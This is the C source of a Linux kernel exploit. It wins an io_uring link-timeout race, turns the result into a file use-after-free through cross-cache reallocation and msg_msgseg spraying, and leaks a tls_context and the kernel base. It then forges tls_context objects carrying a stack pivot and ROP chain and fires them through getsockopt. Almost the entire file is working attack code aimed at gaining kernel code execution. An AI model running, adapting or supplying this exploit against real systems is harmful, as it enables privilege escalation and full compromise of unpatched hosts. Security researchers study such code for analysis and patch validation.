#define _GNU_SOURCE
#include "err_state.h"
#include "rop.h"
#include "ring_helpers.h"
#include "affinity.h"
#include "manager.h"
#include <liburing.h>


static inline err_t submit_timeouts(struct manager *mgr)
{
    struct timespec timeout_ts = {0}, link_ts = {0};

    /* Never fire - practically infinite time */
    timeout_ts.tv_sec = INF_TIME;

    for (int i = 0; i < N_TIMEOUT_OBJS; i++) {
        /* Scale the timeout for the link to
         * stagger the race slightly. */
        link_ts.tv_nsec = TIMEOUT + (i * TIMEOUT_SCALE);

        /* Setup the timeout submission queue entry (SQE).
         * This will retain a dangling reference to the link
         * request if the (initial) race is won. */
        init_timeout_sqe(&mgr->uaf_ring, &timeout_ts);

        /* Setup the link SQE. This directs the kernel
         * to construct our UAF request object from which
         * we will induce the file UAF. */
        init_link_sqe(&mgr->uaf_ring, &link_ts);

        /* Submit the two SQEs for this iteration. */
        IF_ERR(io_uring_submit(&mgr->uaf_ring)) {
            perror("submit_timeouts:io_uring_submit");
            return ERR;
        }
    }
    return SUCC;
}

static inline err_t submit_tee(struct manager *mgr, int32_t index)
{
#define TAG (1330)
    register int in = 0, out = 0;
    struct io_uring_sqe* sqe_tee = NULL;

    sqe_tee = io_uring_get_sqe(&mgr->tee_ring);
    if (sqe_tee == NULL) {
        perror("submit_tee:io_uring_get_sqe");
        return ERR;
    }

    in = mgr->pipes_in[index][RD];
    out = mgr->pipes_out[index][WR];
    if (IS_ERR(in) || IS_ERR(out)) {
        perror("submit_tee:fd=-1");
        return ERR;
    }

    io_uring_prep_tee(sqe_tee, in, out, 3, 0);
    sqe_tee->user_data = index + TAG;

    IF_ERR(io_uring_submit(&mgr->tee_ring)) {
        perror("submit_tee:io_uring_submit");
        return ERR;
    }
    return SUCC;
}

void uaf_catch(void *arg)
{
    struct manager *mgr = (struct manager *)arg;
    IF_ERR_PTR(mgr) return;

    IF_ERR(set_condition(&mgr->uaf_mutex,
                         &mgr->uaf_cond,
                         &mgr->threads_go)) {
        return;
    }
    /* Delay for some offset from the TIMEOUT
     * used in the link_timeout request. */
    struct timespec ts = {0};
    ts.tv_nsec = TIMEOUT + mgr->sleep_before_tee;
    nanosleep(&ts, NULL);

    for (int i = 0; i < N_TIMEOUT_OBJS; i++) {
        submit_tee(mgr, i);
    }
}

void uaf_trigger(void *arg)
{
    struct manager *mgr = (struct manager *)arg;
    IF_ERR_PTR(mgr)
        return;
    /* We wait here to start the race. Hopefully,
     * synchronise trigger and catch threads. */
    IF_ERR(wait_condition(&mgr->uaf_mutex,
                          &mgr->uaf_cond,
                          &mgr->threads_go)) {
        return;
    }

    /* Submit timeout and link timeout requests. */
    IF_ERR(submit_timeouts(mgr))
        return;
}

static inline err_t close_other_pipes(struct manager *mgr, int32_t *hits)
{
    int skip = 0;
    for (int i = 0; i < N_PIPES; i++) {

        for (int j = 0; j < hits[N_PIPES]; j++) {
            if (hits[j] == i) {
                skip = 1;
            }
        }
        if (skip) {
            skip = 0;
            continue;
        }
        write(mgr->pipes_in[i][1], "AAA", 3);
        write(mgr->pipes_out[i][1], "AAA", 3);
        close(mgr->pipes_in[i][0]);
        close(mgr->pipes_out[i][0]);
        close(mgr->pipes_in[i][1]);
        close(mgr->pipes_out[i][1]);
    }
}

static inline err_t create_file_uaf(struct manager *mgr, int32_t *hits)
{
    cc_next(mgr->cc);
    cc_next(mgr->cc);
    cc_next(mgr->cc);

    for (int i = 0; i < hits[N_PIPES]; i++) {

        int p_idx = hits[i];
        int in = mgr->pipes_in[p_idx][WR];
        int out = mgr->pipes_out[p_idx][WR];

        write(in, "AAA", 3);
        write(out, "AAA", 3);
    }

    usleep(200000);

    for (int i = 0; i < hits[N_PIPES]; i++) {
        int p_idx = hits[i];
        int in = mgr->pipes_in[p_idx][WR];
        close(in);
    }
    return SUCC;
}

static inline err_t reallocate_filp_page(struct manager *mgr)
{
    IF_ERR_RET(spray_msg(mgr->msq_ids, TOTAL_MSGS, mgr->spray, MSG_SIZE))
    memset((char *)mgr->spray, 0x00, MSG_SIZE);
    return SUCC;
}

static inline err_t double_free_file(struct manager *mgr, int32_t *hits)
{
    for (int i = 0; i < hits[N_PIPES]; i++) {
        int p_idx = hits[i];
        int in = mgr->pipes_in[p_idx][RD];
        close(in);
    }
    return SUCC;
}

static inline err_t prepare_tls_overwrite(struct manager *mgr)
{
#define KHEAP_PTR_OFF (200)
#define RO_PTR_OFF (224)
#define LIST_OFF (0x98)
#define BASE_OFF (0x180b660)
    /* Extract pointers and wipe the data, ready for spray. */
    char *leak = (char *)mgr->leak + 4000;
    uint64_t tls_context = *(uint64_t*)&leak[KHEAP_PTR_OFF] - LIST_OFF;
    uint64_t kernel_base = *(uint64_t*)&leak[RO_PTR_OFF] - BASE_OFF;
    printf("[+] Current tls_context @ %lx\n", tls_context);
    printf("[+] Kernel base @ %lx\n", kernel_base);
    memset((char *)mgr->leak, 0, MSG_SIZE);

#define GETSOCKOPT_OFF (40)
#define SK_PROTO_OFF (136)
    /* Prepare sk_proto overwrite, getsockopt() overwrite,
     * stack pivot, and ROP chain contents. */
    char *spray = (char *)mgr->spray;
    prepare_rop(&spray[8], kernel_base);
    *(uint64_t*)&spray[GETSOCKOPT_OFF] = kernel_base + STACK_PIVOT_OFF;;
    *(uint64_t*)&spray[SK_PROTO_OFF] = tls_context;

    /* new_stack is a global from rop.h
     * This is what we'll restore our SP
     * to when we return from KM. */
    new_stack = mmap(NULL, 0x4000,
                     PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (new_stack == MAP_FAILED) {
        perror("run_machine:mmap");
        return ERR;
    }
    new_stack += 0x3ff0;

    return SUCC;
}

static inline err_t overwrite_tls(struct manager *mgr)
{
    struct msgbuf* msg = (struct msgbuf*)mgr->spray;
    for (int i = 0; i < 20; i++) {
        msg->mtype = i + 100;
        if (msgsnd(mgr->msq_ids[i], msg, 257, 0) < 0) {
            perror("msgsnd");
        }
    }
    return SUCC;
}

static inline void print_leak(char *leak)
{
#define TO_LEAK (48)
#define PER_LINE (4)
    printf("[+] Printing out the kernel leak.\n");
    uint64_t *ptr = (uint64_t *)(leak + 4000);
    for (int i = 0; i < TO_LEAK; i++) {
        printf("0x%016lx ", ptr[i]);
        if ((i + 1) % PER_LINE == 0) {
            printf("\n");
        }
    }
    printf("\n");
}

static inline err_t leak_tls_contexts(struct manager *mgr)
{
    char *leak = (char *)mgr->leak;
    uint64_t *store = mgr->msq_ids;
    IF_ERR_RET(leak_msg(DEAD_LIST_PATTERN, store, TOTAL_MSGS, leak, MSG_SIZE))
    print_leak(leak);
    return SUCC;
}

static inline err_t spray_tls_contexts(struct manager *mgr, uint8_t exp)
{
#define BEFORE_LEAK (0)
#define AFTER_LEAK (1)
    switch(exp) {
        case BEFORE_LEAK:
            /* Before the leak occurs we spray
             * "real" tls_context objects to overwrite
             * some msg segment on the heap. */
            upgrade_tls_socks();
            break;
        case AFTER_LEAK:
            /* After the leak, we spray "fake"
             * tls_context objects to initialise
             * our stack pivot and ROP chain. */
            prepare_tls_overwrite(mgr);
            overwrite_tls(mgr);
            break;
        default:
            return ERR;
    }
    return SUCC;
}

err_t init_machine(struct manager *mgr, int32_t *hits)
{
    /* Close the pipes which we determined are not
     * UAF candidates. If we don't do this then
     * we might leave the victim page non-empty. */
    printf("[.] Closing non-candidate pipes.\n");
    IF_ERR_RET(close_other_pipes(mgr, hits))
    usleep(10000);

    printf("[.] Creating file use-after-free.\n");
    IF_ERR_RET(create_file_uaf(mgr, hits))

    printf("[.] Reallocating filp page with cross-cache.\n");
    IF_ERR_RET(reallocate_filp_page(mgr))
    usleep(10000);

    printf("[.] Freeing file again for a msg_msgseg use-after-free.\n");
    IF_ERR_RET(double_free_file(mgr, hits))

    printf("[.] Spraying tls_context objects for a leak.\n");
    IF_ERR_RET(spray_tls_contexts(mgr, BEFORE_LEAK))

    printf("[.] Leaking tls_context object.\n");
    IF_ERR_RET(leak_tls_contexts(mgr))

    printf("[.] Spraying forged tls_context objects with msg_msgseg.\n");
    IF_ERR_RET(spray_tls_contexts(mgr, AFTER_LEAK))

    return SUCC;
}

err_t run_machine(struct manager *mgr)
{
    char *spray = mgr->spray;
    uint64_t tls_context = *(uint64_t*)&spray[SK_PROTO_OFF];
    uint64_t pivot_stack = tls_context + 0x20;

    /* Transfer control inside child task */
    if (!fork()) {
        /* Hopefully run along the ROP chain */
        puts("[+] Calling getsockopt() to trigger execution.");
        getsockopt_all_tls(0x41414141, 0x42424242,
                           pivot_stack, 0x8181818181818181);
    }
    /* Busyloop to prevent exit. */
    for (;;);
    __builtin_unreachable();
}

void uaf_wait_cqe(void *arg)
{
    struct manager *mgr = (struct manager *) arg;
    IF_ERR_PTR(mgr)
        return;

    /* If we get any good CQEs back then we'll store the pipe index
     * in hits[]. Note that `hits[N_PIPES] will be set to hit_count */
    uint8_t hit_count = 0;
    int32_t hits[N_PIPES + 1] = {0};

    struct io_uring_cqe *cqe = NULL;
    for (int i = 0; i < N_WAIT_CQES; i++) {
        /* Block in here until we get another CQE. */
        IF_ERR(io_uring_wait_cqe(&mgr->tee_ring, &cqe)) {
            perror("uaf_wait_cqe:io_uring_wait_cqe\n");
            return;
        }

        IF_ERR_PTR(cqe) {
            perror("uaf_wait_cqe:cqe=NULL");
            break;
        }

        /* A completion event matching the criteria for a candidate
         * of the UAF has been posted. So store its adjusted user_data. */
        if (cqe->res) {
            hits[hit_count++] = (int32_t)cqe->user_data - TAG;
        }
        io_uring_cqe_seen(&mgr->tee_ring, cqe);
    }

    if (hit_count) {
        printf("[+] Successfully won the race, attempting file cross-cache.\n");
        hits[N_PIPES] = hit_count;

        IF_ERR(init_machine(mgr, &hits)) {
            printf("[-] Trying again :/");
            return;
        }
        IF_ERR(run_machine(mgr)) {
            return;
        }

    } else {
        printf("[-] Failed to reallocate the UAF object in the race window\n");
    }
}

err_t race_threads(struct manager *mgr)
{
    /* We detect the completion events (CQE) in our uaf_wait_cqe() thread. If any CQEs
     * have a non-zero result value, then we know we've won and we can enter the
     * second stage. This then induces a file UAF and reallocates the filp_cache page.
     * More on this later.
     * */
    IF_ERR(start_threads(mgr, &mgr->wait_cqe_th, uaf_wait_cqe, N_WAIT_TH)) {
        perror("race_threads:start_threads:uaf_wait_cqe");
        return ERR;
    }

    /* Technically there's two races to win. The first is the race to a basic UAF.
     * The second is the race to have reallocated the UAF object as a request
     * with opcode of type IORING_OP_TEE. Of the two, it's easier to win the first.
     * */
    IF_ERR(start_threads(mgr, &mgr->trigger_th, uaf_trigger, N_TRIGGER_TH)) {
        printf("race_threads:start_threads:uaf_trigger");
        return ERR;
    }

    /* But it's basically useless on its own. So we need to use another thread
     * (with entrypoint uaf_catch) to "catch" the request before the kernel
     * reaches a certain block of code inside fs/io_uring.c::io_kill_linked_timeout().
     *
     * Without catching the request before the aforementioned code block, the kernel
     * raises a refcount underflow warning and no interesting state can be reached.
     * */
    IF_ERR(start_threads(mgr, &mgr->catch_th, uaf_catch, N_CATCH_TH)) {
        printf("race_threads:start_threads:uaf_wait_catch");
        return ERR;
    }

    IF_ERR(wait_threads(&mgr->trigger_th, N_TRIGGER_TH)) {
        printf("race_threads:wait_threads:uaf_trigger");
        return ERR;
    }

    /* Wait for the aforementioned threads to complete. */
    IF_ERR(wait_threads(&mgr->catch_th, N_CATCH_TH)) {
        printf("race_threads:wait_threads:uaf_catch");
        return ERR;
    }

    usleep(200000);
    /* Just in case we didn't succeed in getting any CQEs
     * we just unblock the thread with NOP requests. */
    IF_ERR(force_unblock_wait_cqe(&mgr->tee_ring, N_WAIT_CQES)) {
        printf("race_threads:force_unblock_wait_cqe");
    }

    IF_ERR(wait_threads(&mgr->wait_cqe_th, N_WAIT_TH)) {
        printf("race_threads:wait_threads:wait_cqe_th");
        return ERR;
    }
    return SUCC;
}

int main(void)
{
    /* Pin our task to cpu 0 to avoid being rescheduled to another CPU.
     * This is because each slab cache manages per-cpu object freelists.
     * */
    pin_cpu(0);

    /* In new_session we setup:
     * 1) Objects which track our page-allocator controls.
     * 2) The TLS socket server and to-be-TLS sockets.
     *    Later we leak and overwrite a struct tls_context.
     * 3) The io_uring rings (one to trigger, one to catch).
     * 4) The pipes we have as UAF candidates.
     * 5) Cross cache management object.
     * */
    struct manager *mgr = new_session();
    IF_ERR_PTR(mgr)
        goto out;

    /*
     * Enter the main loop to retry the race until it's won.
     * */
    for (;;) {
        /* Allocate the "out" pipes which we don't want to
         * land on any of the potential victim pages. */
        open_pipes(mgr, 0);

        /* Initialise the cross_cache attack to allocate as
         * many file objects as the percpu partial list can
         * hold and drive filp cache to set a new cpu0 "active slab". */
        cc_next(mgr->cc);
        cc_next(mgr->cc);

        /* Allocate the candidate victim objects on the victim page.
         * This page is probably the aforementioned "active slab". */
        open_pipes(mgr, 1);

        /* Setup a thread which detects the UAF candidates.
         * And thread which trigger and catch the UAF on
         * targeted io_kiocb objects. */
        IF_ERR(race_threads(mgr)) {
            printf("main:race_threads");
            break;
        }

        usleep(200000);

        /* Perform cleanup. If we're here it means we failed to win
         * the race or to reallocate the page correctly. Let's try
         * this all over again! */
        IF_ERR(refresh_session(mgr)) {
            printf("main:refresh_session");
            break;
        }
    }

    /* Close down the manager and the TLS socket server. */
    end_session(mgr);
out:
    printf("Exiting now\n");
    return ERR;
}
